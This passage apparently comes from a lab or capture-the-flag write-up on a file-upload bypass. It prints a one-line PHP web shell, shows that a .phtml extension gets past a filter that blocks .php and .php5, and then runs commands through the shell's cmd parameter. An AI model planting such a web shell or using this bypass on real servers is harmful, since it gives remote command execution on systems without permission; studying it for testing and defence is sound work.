
The first file upload that I tried was just a standard php shell script with the payload `<?php echo system($_GET['cmd']); ?>` this results in this output:

<img width="748" height="626" alt="image" src="https://github.com/user-attachments/assets/c92b570a-066f-4e88-bc2c-dfdc74e2cfb6" />

Next I tried the same script except using the php5 extension. This resulted in the same output. Next I tried with the extension phtml. This resulted in the script being uploaded to the `/uploads/` folder successfully:

<img width="731" height="617" alt="image" src="https://github.com/user-attachments/assets/8de096d0-335c-4460-911f-0659711c8e6a" />

To confirm further we can navigate to `/uploads/` as it is viewable by anyone if they can find it:

<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/07dd030d-3562-448f-96fd-dfc4c4f53c28" />

Finally, to exploit this payload we can query the `cmd` parameter that we have in our php script with a variety of commands, some examples below:

<img width="956" height="108" alt="image" src="https://github.com/user-attachments/assets/812b2261-c9df-400b-9910-0c4e7140dd08" />

<img width="956" height="108" alt="image" src="https://github.com/user-attachments/assets/c5c77bb0-b4fe-4d86-a975-4334564eddb6" />
